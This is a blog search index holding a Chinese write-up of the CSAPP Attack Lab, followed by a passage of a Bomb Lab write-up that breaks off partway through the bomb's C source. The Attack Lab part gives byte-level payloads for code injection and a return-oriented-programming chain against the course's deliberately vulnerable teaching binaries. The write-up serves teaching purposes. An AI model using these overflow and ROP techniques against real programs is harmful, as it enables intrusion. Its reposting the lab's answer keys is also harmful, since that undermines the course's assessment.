<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>《深入理解计算机系统》Attack Lab实验解析</title>
      <link href="/2020/02/11/CSAPP-Attacklab/"/>
      <url>/2020/02/11/CSAPP-Attacklab/</url>
      
        <content type="html"><![CDATA[<h2 id="Attack-lab"><a href="#Attack-lab" class="headerlink" title="Attack lab"></a>Attack lab</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>这是CSAPP的第三个实验，跟Bomb lab有些类似，都需要你对X86-64汇编语言以及一套调试的方式有着足够的理解，所不同的是，这一次更注重于写汇编语言的代码，并且以Byte的格式注入到程序内，用来攻击程序，简单地说，这个实验就是模拟一个黑客所做的事情。</p><p>实验分为两个部分注入攻击和返回值攻击，前者的栈的地址是固定的，裸奔状态，后者每次栈内存起始地址都会发生变化，难度有所增加。与Bomb lab不同的是，这个实验如果攻击失败，不会扣分，可以放心地进行各种调试和实验的操作。</p><a id="more"></a><h3 id="一些需要用到的操作"><a href="#一些需要用到的操作" class="headerlink" title="一些需要用到的操作"></a>一些需要用到的操作</h3><p>打开Attack lab的文件夹，我们可以发现里面主要有四个文件：</p><p>ctarget 用来进行代码注入攻击<br>rtarget 用来进行返回值攻击<br>cookie.txt 是一个唯一表示的字符串，可以理解为ID，主要是CMU用来防止学生作弊互相抄答案，里面很多需要攻击的函数，都要将这个作为参数传入<br>hex2raw 用来将64进制Byte码变成字符串，可用来传入到需要攻击的程序中</p><p>此外，根据handout的提示和我个人做这个lab的经验，以下一些命令可能会非常有用:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">unix&gt;</span> ./hex2raw &lt; ans.txt | ./ctarget -q</span><br></pre></td></tr></table></figure></p><p>通过管道来将ans里的Byte码变成字符串传入需要攻击的程序中，-q是不发信息给服务器，自学用需要加上这个参数。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">unix&gt;</span> gcc -c example.s</span><br><span class="line"><span class="meta">unix&gt;</span> objdump -d example.o &gt; example.d</span><br></pre></td></tr></table></figure><p>上面这段是可以用来现实x86-64汇编语言所对应的16位字节码<br>比如，example.s<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; Example of hand-generated assembly code</span></span><br><span class="line">pushq   <span class="number">$0</span>xabcdef</span><br><span class="line">addq    <span class="number">$17</span>,%rax</span><br><span class="line">movl    %eax,%edx</span><br><span class="line"><span class="comment">; Push value onto stack</span></span><br><span class="line"><span class="comment">; Add 17 to %rax</span></span><br><span class="line"><span class="comment">; Copy lower 32 bits to %edx</span></span><br></pre></td></tr></table></figure></p><p>对应的example.d则是:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .text:</span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0: 68 ef cd ab 00,      pushq  $0xabcdef</span><br><span class="line">   5: 48 83 c0 11          add    $0x11,%rax</span><br><span class="line">   9: 89 c2 mov            %eax,%edx</span><br></pre></td></tr></table></figure></p><h2 id="Part1-Code-Injection-Attacks"><a href="#Part1-Code-Injection-Attacks" class="headerlink" title="Part1 Code Injection Attacks"></a>Part1 Code Injection Attacks</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>这是lab的第一部分，代码注入攻击，ctarget是我们要攻击的程序，题目告诉我们ctarget里有一个叫做test的函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>根据题目的意思这个函数应该是每次都会调用的，然后这个函数会调用一个不安全的getbuf函数，有点类似于get，不检查读入的字符串的大小，也不加以任何保护，使得我们利用getbuf，可以对其进行代码注入达到攻击的效果, 具体原理可以参见CSAPP第三版3-10，心中要有下图，原理方能熟稔于心:</p><p><img src="https://blogpage.oss-cn-hongkong.aliyuncs.com/code-injection.png"></p><h3 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase 1"></a>Phase 1</h3><p>第一关要求我们让test不返回，而是getbuf后直接运行一个叫做touch1的函数，其C语言代码如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Touch1!: You called touch1()\n"</span>);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>看得出来，就是一个直接运行的函数，没有参数，显然我们只需要把它的地址注入到运行栈，将原先的返回地址覆盖掉即可，将touch1用gdb反汇编，我们得出touch1的入口地址为:<br>0x4017c0，反汇编getbuf，得到如下代码:<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00000000004017a8</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">sub</span>    <span class="number">$0</span>x28,%rsp</span><br><span class="line"><span class="number">0x00000000004017ac</span> &lt;+<span class="number">4</span>&gt;:<span class="keyword">mov</span>    %rsp,%rdi</span><br><span class="line"><span class="number">0x00000000004017af</span> &lt;+<span class="number">7</span>&gt;:callq  <span class="number">0x401a40</span> &lt;Gets&gt;</span><br><span class="line"><span class="number">0x00000000004017b4</span> &lt;+<span class="number">12</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x1,%eax</span><br><span class="line"><span class="number">0x00000000004017b9</span> &lt;+<span class="number">17</span>&gt;:<span class="keyword">add</span>    <span class="number">$0</span>x28,%rsp</span><br><span class="line"><span class="number">0x00000000004017bd</span> &lt;+<span class="number">21</span>&gt;:retq</span><br></pre></td></tr></table></figure></p><p>注意到rsp，一上来减去40个字节，说明栈getbuf分配的栈深为40字节，我们就填充40个字节的字符，最后再加上touch1的入口地址即可，所以我们可以得出所需要传入的Byte码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ef ef ef ef ef ef ef ef ef ef</span><br><span class="line">ef ef ef ef ef ef ef ef ef ef</span><br><span class="line">ef ef ef ef ef ef ef ef ef ef</span><br><span class="line">ef ef ef ef ef ef ef ef ef ef</span><br><span class="line">c0 17 40</span><br></pre></td></tr></table></figure></p><p>根据题目要求，字节序反过来，比如要表示40 17 c0则应该传入c0 17 40。<br>将这段字符Byte输入，则可以完成第一关的攻击。</p><h3 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase 2"></a>Phase 2</h3><p>第二关稍微复杂一些，要求运行touch2，其C语言代码如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span>&#123;</span><br><span class="line">    vlevel = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(val == cookie)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>,val);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"Misfire!: You called touch2(0x%.8x)\n"</span>,val);</span><br><span class="line">        fail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>与touch1不同的是touch2需要我们给他传一个参数，也就是我们的cookie，自学版cookie值是0x59b997fa，也就是说我们需要先把参数%rdi的数值设置为0x59b997fa，再调用touch2。</p><p>根据handout里的提示，直接利用jmp或者callq来调用函数比较麻烦，推荐我们用retq，这次我们需要将代码也注入到栈里，以下就是我们需要注入的代码<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pushq <span class="number">$0</span>x4017ec <span class="comment">;touch2的地址，存入栈口</span></span><br><span class="line"><span class="keyword">movq</span> <span class="number">$0</span>x59b997fa,%rdi <span class="comment">; 将cookie放入rdi，当做第一个参数传入</span></span><br><span class="line">retq <span class="comment">;返回</span></span><br></pre></td></tr></table></figure></p><p>这一段我们直接让getbuf读入，放入栈中，当然我们还需要首先让getbuf读取完后不返回test，而是直接返回到这段代码，也就是原来栈的入口，给getbuf设置下断点，得出栈，也就是注入的代码的位置，0x5561dc78,将最后返回的位置用该位置覆盖即可，答案如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">68 ec 17 40 00</span><br><span class="line">48 c7 c7 fa 97 b9 59</span><br><span class="line">c3</span><br><span class="line">ef ef ef ef ef ef ef ef ef</span><br><span class="line">ef ef ef ef ef ef ef ef ef</span><br><span class="line">ef ef ef ef ef ef ef ef ef</span><br><span class="line">78 dc 61 55</span><br></pre></td></tr></table></figure></p><h3 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase 3"></a>Phase 3</h3><p>让getbuf完了后运行touch3，touch3代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">    <span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>;       <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        fail(<span class="number">3</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这个稍微麻烦点儿，touch3要求传入字符串，字符串为cookie以字符串的形式表示，前面的”0x“舍去。</p><p>我们发现touch3调用了hexmatch函数，而该函数一上来就申请了个110byte大小的空间，说明我们之前的空间会被覆盖掉，为了保证字符串存在的位置不会被覆盖，我们最好将cookie字符串存在test的栈区中，其他部分跟level2差不多，<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pushq <span class="number">$0</span>x4018fa <span class="comment">;touch3的位置</span></span><br><span class="line"><span class="keyword">lea</span> <span class="number">0x8</span>(%rsp),%rdi <span class="comment">; 存放字符串的头指针</span></span><br><span class="line">retq</span><br></pre></td></tr></table></figure></p><p>利用gcc得出以上汇编语言的字节码，答案如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">68 fa 18 40 00</span><br><span class="line">48 8d 7c 24 08</span><br><span class="line">c3 ef ef ef ef</span><br><span class="line">ef ef ef ef ef</span><br><span class="line">ef ef ef ef ef</span><br><span class="line">ef ef ef ef ef</span><br><span class="line">ef ef ef ef ef</span><br><span class="line">ef ef ef ef ef</span><br><span class="line">78 dc 61 55 00 00 00 00 </span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure></p><p>因为64位字节码一次读取8个byte，所以我们应当将注入的地址（也就是栈的初始地址）后面用00进行padding，否则会报错，后面那一长串35 - 00就是对应的”5561dc78“的字节码，00表示字符串结束，很容易忘掉。</p><h2 id="Return-Oriented-Programming"><a href="#Return-Oriented-Programming" class="headerlink" title="Return Oriented Programming"></a>Return Oriented Programming</h2><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>这一部分是攻击rtarget这个文件，有level2和level3两个部分，分别是重复前面phase2和phase3的攻击效果，所不同的是rtarget有一些保护措施，例如栈地址随机化和部分栈内容是只读的，因此像ctarget一样直接注入代码是没有用的，对于这种保护措施，我们依然有方法去进行攻击，这个就是Return Oriented Programming</p><p>这种攻击方式的原理是，程序的汇编语言代码中，会出现我们需要的代码片段，并且以0xc3，也就是返回为终止，这种代码片段叫做gadget，合理利用gadget，我们就能实现return oriented programming这种攻击模式。</p><p>举个例子<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setval_210</span><span class="params">(<span class="keyword">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>上述这段代码，是将一个unsigned指针的值改变成一个很奇怪的数字，这个代码段乍看之下没啥用，不过如果我们观察它的汇编语言代码：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f15 &lt;setval_210&gt;:</span><br><span class="line">  400f15:       c7 <span class="number">07</span> d4 <span class="number">48</span> <span class="number">89</span> c7       movl   <span class="number">$0</span>xc78948d4,(%rdi)</span><br><span class="line">  400f1b:       c3                      retq</span><br></pre></td></tr></table></figure></p><p>我们发现第一行是48 89 c7，这个在x86-64汇编语言中代表了movq %rax, %rdi这条语句，并且以c3也就是retq为结束，即如果我们能够让程序从400f18开始运行，则相当于运行了movq %rax, %rdi，并且返回。</p><p>而这样的片段就叫做gadget，我们如果将栈上精心放一些gadget的地址，如下图这样：</p><p><img src="https://blogpage.oss-cn-hongkong.aliyuncs.com/rop.jpg"></p><p>就可以让程序运行一些我们所期望它运行的代码片段，从而可以绕过随机化栈地址和只读栈地址这种保护策略。</p><p>本题中有一个这样的代码仓库，叫做farm，题目要求我们利用farm里的gadget重新完成一遍phase2和phase3的攻击，也就是Phase4和Phase5。</p><h3 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase 4"></a>Phase 4</h3><p>利用gadget实现phase2的攻击，也就是运行touch2，题目有一个提示，我们只需要用到start_farm和mid_farm中间的gadget就可以了。</p><p>根据我们之前做Phase2的经验，我们需要将%rdi里的值设置为cookie，题目给我们提供了几张表用来帮助我们分别出需要可能会用到的Byte：</p><p><img src="https://blogpage.oss-cn-hongkong.aliyuncs.com/0DFB2348-E6DC-4320-B2DD-4F4C11F62682.png"></p><p>结合这个表观察farm，我们发现下面这段汇编有跟%rdi有关的命令<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4019a0: <span class="number">8d</span> <span class="number">87</span> <span class="number">48</span> <span class="number">89</span> c7 c3     <span class="keyword">lea</span> -<span class="number">0x3c3876b8</span>(%rdi), %eax</span><br><span class="line">4019a6: c3                    retq</span><br></pre></td></tr></table></figure></p><p>其中48 89 c7 c3就是movq %rax, %rdi<br>不过我们还需要将coookie放到%rax里，这里我们可以用popq %rax的方法，从栈中把cookie读入到%rax中，所以我们所需要的语句其实是：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">popq %rax</span><br><span class="line"><span class="keyword">movq</span> %rax, %rdi</span><br></pre></td></tr></table></figure></p><p>在farm中我们能找到这样一行:<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4019a7: <span class="number">8d</span> <span class="number">87</span> <span class="number">51</span> <span class="number">73</span> <span class="number">58</span> <span class="number">90</span>     <span class="keyword">lea</span> -<span class="number">0x6fa78caf</span>(%rdi), %eax</span><br><span class="line">4019ad: c3                    retq</span><br></pre></td></tr></table></figure></p><p>其中58是popq %rax，而90则相当于是空行，pass的意思，有了这两个我们就很容易地构造出所需要传入的字符串了:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ef ef ef ef ef ef ef ef ef ef </span><br><span class="line">ef ef ef ef ef ef ef ef ef ef</span><br><span class="line">ef ef ef ef ef ef ef ef ef ef</span><br><span class="line">ef ef ef ef ef ef ef ef ef ef</span><br><span class="line">ab 19 40 00 00 00 00 00  ;popq %rax</span><br><span class="line">fa 97 b9 59 00 00 00 00  ;cookie</span><br><span class="line">a3 19 40 00 00 00 00 00  ;movq %rax, %rdi</span><br><span class="line">ec 17 40 00 00 00 00 00  ;touch2</span><br></pre></td></tr></table></figure><h3 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase 5"></a>Phase 5</h3><p>Phase 5是利用start_farm到end_farm之间的gadget实现Phase 3的攻击，handout推荐这部分作为附加部分，暂时我就先不做了，原理上是一致的，不过要看的代码段多了一点儿，根据作业提示，8个gadgets就可以搞定，有兴趣可以自己尝试下，作为挑战。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>两种基本的攻击手法，code injection 和 return oriented programming，很有趣的实验，可以过把黑客的瘾，同时也能让学生对于栈和栈内存泄漏的bug有更加清晰的认识，相信如果认真做完这个lab，定能深刻领会到缓冲区溢出的危害和get这个命令的不安全性，在国内读书的时候，get只是在书上草草带过，说最好不要用，没有具体的告诉我们原理，这个lab可以当做计算机安全的一个入门。</p>]]></content>
      
      
      <categories>
          
          <category> CSAPP lab </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
            <tag> Assembly Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《深入理解计算机系统》Bomb Lab实验解析</title>
      <link href="/2020/01/12/CSAPP-Bomblab/"/>
      <url>/2020/01/12/CSAPP-Bomblab/</url>
      
        <content type="html"><![CDATA[<h2 id="Bomb-Lab"><a href="#Bomb-Lab" class="headerlink" title="Bomb Lab"></a>Bomb Lab</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>这是CMU15213课程的第二个实验，也是十分经典的一个实验，世界上用CSAPP当教科书的高校一般都会保留这个实验，实验要求是给一个用C语言编写的可执行文件bomb，你可以看到它主函数的C语言代码，除此之外，一概不知，实验分为六个阶段，每个阶段需要输入一串字符，有点像破译密码，如果六次输入的密码都是对的，炸弹解除，否则炸弹会爆炸(退出，并打印爆炸信息)，如果是CMU的学生，每个人获得的炸弹是不一样的（高超的 反作弊技巧），每次爆炸会扣0.5分，扣满20分为止。不过我们作为自学党，没有这个限制，用的是自学用bomb，随便炸，根本不虚，不过为了达成良好的学习效果，还是尽可能减少爆炸次数。</p><a id="more"></a><h3 id="C语言bomb源代码"><a href="#C语言bomb源代码" class="headerlink" title="C语言bomb源代码"></a>C语言bomb源代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"support.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"phases.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Note to self: Remember to erase this file so my victims will have no</span></span><br><span class="line"><span class="comment"> * idea what is going on, and so they will all blow up in a</span></span><br><span class="line"><span class="comment"> * spectaculary fiendish explosion. -- Dr. Evil </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">FILE *infile;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *input;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Note to self: remember to port this bomb to Windows and put a </span></span><br><span class="line"><span class="comment">     * fantastic GUI on it. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When run with no arguments, the bomb reads its input lines </span></span><br><span class="line"><span class="comment">     * from standard input. */</span></span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">1</span>) &#123;  </span><br><span class="line">infile = <span class="built_in">stdin</span>;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When run with one argument &lt;file&gt;, the bomb reads from &lt;file&gt; </span></span><br><span class="line"><span class="comment">     * until EOF, and then switches to standard input. Thus, as you </span></span><br><span class="line"><span class="comment">     * defuse each phase, you can add its defusing string to &lt;file&gt; and</span></span><br><span class="line"><span class="comment">     * avoid having to retype it. */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (argc == <span class="number">2</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(infile = fopen(argv[<span class="number">1</span>], <span class="string">"r"</span>))) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s: Error: Couldn't open %s\n"</span>, argv[<span class="number">0</span>], argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* You can't call the bomb with more than 1 command line argument. */</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Usage: %s [&lt;input_file&gt;]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Do all sorts of secret stuff that makes the bomb harder to defuse. */</span></span><br><span class="line">    initialize_bomb();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome to my fiendish little bomb. You have 6 phases with\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"which to blow yourself up. Have a nice day!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Hmm...  Six phases must be more secure than one phase! */</span></span><br><span class="line">    input = read_line();             <span class="comment">/* Get input                   */</span></span><br><span class="line">    phase_1(input);                  <span class="comment">/* Run the phase               */</span></span><br><span class="line">    phase_defused();                 <span class="comment">/* Drat!  They figured it out!</span></span><br><span class="line"><span class="comment">      * Let me know how they did it. */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Phase 1 defused. How about the next one?\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The second phase is harder.  No one will ever figure out</span></span><br><span class="line"><span class="comment">     * how to defuse this... */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_2(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"That's number 2.  Keep going!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* I guess this is too easy so far.  Some more complex code will</span></span><br><span class="line"><span class="comment">     * confuse people. */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_3(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Halfway there!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Oh yeah?  Well, how good is your math?  Try on this saucy problem! */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_4(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"So you got that one.  Try this one.\n"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Round and 'round in memory we go, where we stop, the bomb blows! */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_5(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Good work!  On to the next...\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This phase will never be used, since no one 